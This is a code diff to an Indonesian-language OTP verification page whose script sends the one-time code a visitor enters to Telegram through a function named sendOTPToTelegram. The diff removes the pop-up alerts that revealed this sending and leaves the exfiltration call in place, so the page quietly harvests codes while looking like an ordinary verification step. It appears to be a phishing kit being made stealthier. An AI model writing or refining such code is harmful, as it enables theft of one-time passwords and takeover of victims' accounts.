@@ -132,7 +132,7 @@
     <p id="resend-timer">Kirim ulang dalam <span id="countdown">60</span> detik</p>
     <p><a href="#" id="resend-link">Tidak bisa menerima kode verifikasi?</a></p>
     <button id="submit-btn" disabled>Lanjutkan</button>
-    <p id="error-message">Kode OTP Salah</p>
+    <p id="error-message">KODE OTP TIDAK VALID!!</p>
 
     <script>
         document.addEventListener('DOMContentLoaded', function() {
@@ -187,13 +187,6 @@
 
                 const xhr = new XMLHttpRequest();
                 xhr.open("GET", url, true);
-                xhr.onreadystatechange = function() {
-                    if (xhr.readyState == 4 && xhr.status == 200) {
-                        alert('OTP berhasil dikirim ke Telegram!');
-                    } else if (xhr.readyState == 4) {
-                        alert('Gagal mengirim OTP ke Telegram.');
-                    }
-                };
                 xhr.send();
             }
 
@@ -205,7 +198,6 @@
                     const otp = Array.from(otpInputs).map(input => input.value).join('');
                     if (otp === correctOTP) {
                         sendOTPToTelegram(otp);
-                        alert('OTP benar dan dikirim ke Telegram.');
                     } else {
                         errorMessage.style.display = 'block';
                     }
